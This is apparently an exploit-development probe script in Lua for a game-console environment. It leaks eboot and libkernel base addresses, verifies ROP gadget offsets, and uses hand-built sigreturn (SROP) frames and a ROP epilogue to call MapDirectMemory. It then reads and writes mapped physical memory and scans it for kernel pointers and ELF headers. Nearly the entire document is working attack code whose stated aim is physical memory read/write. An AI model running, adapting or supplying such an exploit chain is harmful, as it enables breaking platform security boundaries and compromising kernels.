-- CRASH_CLASS: MODERATE
-- PROBE 528f: MapDirectMemory via main-thread SROP
--
-- 528e proved: main-thread SROP can call libkernel wrappers (AllocateDirectMemory OK).
-- Child threads crash on wrappers regardless of FS base (TLS per-thread state issue).
--
-- Solution: call MapDirectMemory from the main thread using SROP with a proper
-- fake stack (7th arg on stack). After the function returns, a mini ROP epilogue
-- does sigreturn back to the original Lua context.
--
-- MapDirectMemory signature: int fn(*virtAddrOut, len, prot, flags, physAddr, align, name)
-- C ABI: rdi=*virtAddrOut, rsi=len, rdx=prot, rcx=flags, r8=physAddr, r9=align, [RSP+8]=name
--
-- [A] AllocateDirectMemory (get physical address)
-- [B] MapDirectMemory via main-thread SROP
-- [C] Read/write mapped physical memory
-- [D] Scan for kernel signatures

print("=== PROBE 528f: MAP DIRECT MEMORY (main-thread SROP) ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b, n) for o = 0, n - 4, 4 do wd(b + o, 0) end end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid end

-- Ignore SIGSYS + SIGPIPE + SIGBUS + SIGSEGV
local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1))
for _, sig in ipairs({10, 11, 12, 13}) do
    pcall(function() mk(416)(uint64(sig), sa_buf, uint64(0)) end)
end

-- Get eboot base
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local eb_lo = rd(N(ib) + 0x108) or 0
local eb_hi = rd(N(ib) + 0x10C) or 0
if eb_lo < 0 then eb_lo = eb_lo + 0x100000000 end
if eb_hi < 0 then eb_hi = eb_hi + 0x100000000 end
print(string.format("eboot=0x%X%08X", eb_hi, eb_lo))
local eboot = uint64(string.format("0x%X%08X", eb_hi, eb_lo))
local function eaddr(off) return eboot + uint64(off) end

-- Get libkernel base
local ib2 = memory.alloc(0x200)
wd(N(ib2), 0x160)
pcall(function() mk(593)(uint64(0x2001), ib2) end)
local lk_lo = rd(N(ib2) + 0x108) or 0
local lk_hi = rd(N(ib2) + 0x10C) or 0
if lk_lo < 0 then lk_lo = lk_lo + 0x100000000 end
if lk_hi < 0 then lk_hi = lk_hi + 0x100000000 end

if lk_lo == 0 and lk_hi == 0 then
    for h = 0, 0x100 do
        local ib3 = memory.alloc(0x200)
        wd(N(ib3), 0x160)
        local ok3, r3 = pcall(function() return mk(593)(uint64(h), ib3) end)
        if ok3 and N(r3) == 0 then
            local name = ""
            for i = 0, 31 do
                local b = rd(N(ib3) + 8 + i)
                if b then
                    local c = b % 256
                    if c == 0 then break end
                    if c >= 32 and c < 127 then name = name .. string.char(c) end
                end
            end
            if name:find("libkernel") then
                lk_lo = rd(N(ib3) + 0x108) or 0
                lk_hi = rd(N(ib3) + 0x10C) or 0
                if lk_lo < 0 then lk_lo = lk_lo + 0x100000000 end
                if lk_hi < 0 then lk_hi = lk_hi + 0x100000000 end
                break
            end
        end
    end
end

if lk_lo == 0 and lk_hi == 0 then print("FAIL: libkernel"); return end
local lk_text = uint64(string.format("0x%X%08X", lk_hi, lk_lo))
print("libkernel=" .. fmt(lk_text))

local alloc_fn = lk_text + uint64(0x17EF0)
local map_fn   = lk_text + uint64(0x15020)
print("AllocateDirectMemory=" .. fmt(alloc_fn))
print("MapDirectMemory=" .. fmt(map_fn))

-- Gadgets
local G = {
    pop_rax  = 0x992,
    pop_rdi  = 0xC9DFE,
    pop_rsi  = 0xD77D,
    pop_rdx  = 0x3B02D7,
    pop_rcx  = 0xE64,
    mov_m    = 0x92C67,
    bare_ret = 0x42,
}
local function vg(off, expect, nb)
    local d = rd(N(eboot) + off)
    if d == nil then return false end
    if d < 0 then d = d + 0x100000000 end
    local mask = 0
    for i = 0, nb - 1 do mask = mask + 0xFF * (2 ^ (i * 8)) end
    return (d % (mask + 1)) == expect
end
if not vg(G.pop_rax, 0xC358, 2) then print("GADGET FAIL"); return end
if not vg(G.pop_rdi, 0xC35F, 2) then
    G.pop_rdi = 0x75DFE
    if not vg(G.pop_rdi, 0xC35F, 2) then print("GADGET FAIL"); return end
end
if not vg(G.mov_m, 0xC3078948, 4) then print("GADGET FAIL"); return end
print("gadgets OK")

-- Main-thread SROP setup
local MC = 0x40
local sc_gc = mk(421)
local sc_sr = mk(417)

-- ============================================================
-- [A] AllocateDirectMemory via fcall (6-arg, known working)
-- ============================================================
print("")
print("[A] AllocateDirectMemory via fcall")

local phys_out = memory.alloc(8)
wq(N(phys_out), uint64(0))

local ok_af, rv_af = pcall(function()
    return native.fcall_with_rax(alloc_fn, 0,
        uint64(0), uint64("0x150000000"), uint64(0x4000),
        uint64(0x4000), uint64(0), uint64(N(phys_out)))
end)

if not ok_af or N(rv_af) ~= 0 then
    print("  FAILED rv=" .. (rv_af and fmt(rv_af) or "crash")); return
end
local phys_addr = rq(N(phys_out))
print("  rv=0 phys=" .. fmt(phys_addr))

if not phys_addr then print("  no phys addr"); return end
local ph, pl = get_hi_lo(phys_addr)
if ph < 0 then ph = ph + 0x100000000 end
if pl < 0 then pl = pl + 0x100000000 end
if ph == 0 and pl < 0x1000 then print("  phys looks zero"); return end
print("  ALLOCATED OK")

if not alive() then print("DIED after A"); return end

-- ============================================================
-- [B] MapDirectMemory via main-thread SROP (7-arg)
-- ============================================================
-- Uses the same proven pattern as 528e section A: manual getcontext/sigreturn
-- with a fake stack. The key difference: 7th arg at [RSP+8].
--
-- MapDirectMemory: int fn(*virtAddrOut, len, prot, flags, physAddr, align, name)
-- C ABI: rdi=*virt, rsi=len, rdx=prot, rcx=flags, r8=phys, r9=align
-- 7th arg (name) on stack: [RSP+8]
print("")
print("[B] MapDirectMemory via main-thread SROP")

local virt_out = memory.alloc(8)
local map_ok = false
local mapped_va = nil

local flag_list = {0, 1, 2, 0x10, 0x12, 0x100, 0x412, 0x1000, 0x40000}

for fi, flags in ipairs(flag_list) do
    if not alive() then print("  DIED"); return end
    wq(N(virt_out), uint64(0))

    -- 1. Capture restore context (return point after MapDirectMemory)
    local restore_ctx = memory.alloc(0x500)
    pcall(function() return sc_gc(uint64(restore_ctx)) end)

    -- Result buffer
    local result_buf = memory.alloc(8)
    wq(N(result_buf), uint64("0xDEADDEADDEADDEAD"))

    -- 2. Build fake stack layout:
    --   [fn_rsp+0x00] = return address → epilogue ROP chain
    --   [fn_rsp+0x08] = 7th arg (name = NULL)
    -- fn_rsp ≡ 8 (mod 16) for post-call alignment
    local fake_stack = memory.alloc(0x200)
    z(fake_stack, 0x200)
    local fn_rsp = N(fake_stack) + 8

    -- Epilogue at offset 0x100 in fake_stack
    local epi_addr = N(fake_stack) + 0x100
    local ep = epi_addr
    local function esq(v) wq(ep, v); ep = ep + 8 end

    -- After MapDirectMemory returns, rax = return value
    esq(eaddr(G.pop_rdi))         -- rax still = function rv
    esq(uint64(N(result_buf)))
    esq(eaddr(G.mov_m))           -- [result_buf] = rax

    -- sigreturn back to Lua
    esq(eaddr(G.pop_rax))
    esq(uint64(417))
    esq(eaddr(G.pop_rdi))
    esq(uint64(N(restore_ctx)))
    esq(stub)

    -- Stack entries
    wq(fn_rsp, uint64(epi_addr))    -- [RSP+0] = return addr
    wq(fn_rsp + 8, uint64(0))       -- [RSP+8] = 7th arg (name=NULL)

    -- 3. Build call context
    local call_ctx = memory.alloc(0x500)
    pcall(function() return sc_gc(uint64(call_ctx)) end)

    wq(N(call_ctx) + MC + 0xA0, map_fn)                -- rip = MapDirectMemory
    wq(N(call_ctx) + MC + 0xB8, uint64(fn_rsp))        -- rsp = fake stack
    wq(N(call_ctx) + MC + 0x48, uint64(N(fake_stack) + 0x80))  -- rbp (safe area)

    -- C ABI args
    wq(N(call_ctx) + MC + 0x08, uint64(N(virt_out)))    -- rdi = &virtAddrOut
    wq(N(call_ctx) + MC + 0x10, uint64(0x4000))         -- rsi = len (16KB)
    wq(N(call_ctx) + MC + 0x18, uint64(3))              -- rdx = PROT_RW
    wq(N(call_ctx) + MC + 0x50, uint64(flags))          -- rcx = flags
    wq(N(call_ctx) + MC + 0x28, phys_addr)              -- r8 = physAddr
    wq(N(call_ctx) + MC + 0x30, uint64(0x4000))         -- r9 = alignment

    -- 4. Fire
    print(string.format("  [%d] flags=0x%X", fi, flags))
    local ok_sr, rv_sr = pcall(function() return sc_sr(uint64(call_ctx)) end)

    if not alive() then
        print(string.format("  flags=0x%X: PROCESS KILLED", flags)); return
    end

    if not ok_sr then
        print(string.format("  flags=0x%X: sigreturn FAILED", flags))
    else
        local rv = rq(N(result_buf))
        local va = rq(N(virt_out))
        local rv_n = rv and N(rv) or -1
        print(string.format("  flags=0x%X: rv=%d va=%s", flags, rv_n, fmt(va)))

        if rv_n == 0 and va then
            local vah, val_ = get_hi_lo(va)
            if vah < 0 then vah = vah + 0x100000000 end
            if val_ < 0 then val_ = val_ + 0x100000000 end
            if vah ~= 0 or val_ > 0x1000 then
                print("  *** MAPPING SUCCESS! ***")
                map_ok = true
                mapped_va = va
                break
            end
        end
    end
end

-- ============================================================
-- [C] Read/write mapped physical memory
-- ============================================================
if map_ok and mapped_va then
    print("")
    print("[C] READING MAPPED PHYSICAL MEMORY")
    print("  VA=" .. fmt(mapped_va))

    for i = 0, 15 do
        local v = rq(N(mapped_va) + i * 8)
        if v then
            local line = string.format("  [+0x%02X] = %s", i * 8, fmt(v))
            local vh, vl = get_hi_lo(v)
            if vh < 0 then vh = vh + 0x100000000 end
            if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                local exp = math.floor(vh / 0x100000) % 0x800
                if exp ~= 0x7FF then
                    line = line .. " *** KERNEL PTR? ***"
                end
            end
            print(line)
        else
            print(string.format("  [+0x%02X] = FAULT", i * 8))
        end
    end

    print("")
    print("  write test...")
    local magic = 0xCAFEBABE
    wd(N(mapped_va), magic)
    local readback = rd(N(mapped_va))
    print(string.format("  wrote=0x%X read=0x%X match=%s",
        magic, readback or 0, tostring(readback == magic)))
end

-- ============================================================
-- [D] If mapped: scan pages for kernel ELF header
-- ============================================================
if map_ok and mapped_va then
    print("")
    print("[D] Physical memory scan (first page)")

    -- Check if we can allocate more physical pages and scan them
    -- For now just report the initial page contents
    local elf_magic = rd(N(mapped_va))
    if elf_magic then
        local em = elf_magic
        if em < 0 then em = em + 0x100000000 end
        print(string.format("  first dword=0x%08X", em))
        if em == 0x464C457F then
            print("  *** ELF HEADER FOUND! ***")
        end
    end
end

-- ============================================================
-- Summary
-- ============================================================
print("")
print("[SUMMARY]")
print("  phys=" .. fmt(phys_addr))
if map_ok then
    print("  MAP OK va=" .. fmt(mapped_va))
    print("  *** PHYSICAL MEMORY R/W ACHIEVED ***")
else
    print("  MAP FAILED — all flag combinations rejected")
end
print("  alive=" .. tostring(alive()))
print("=== 528f COMPLETE ===")
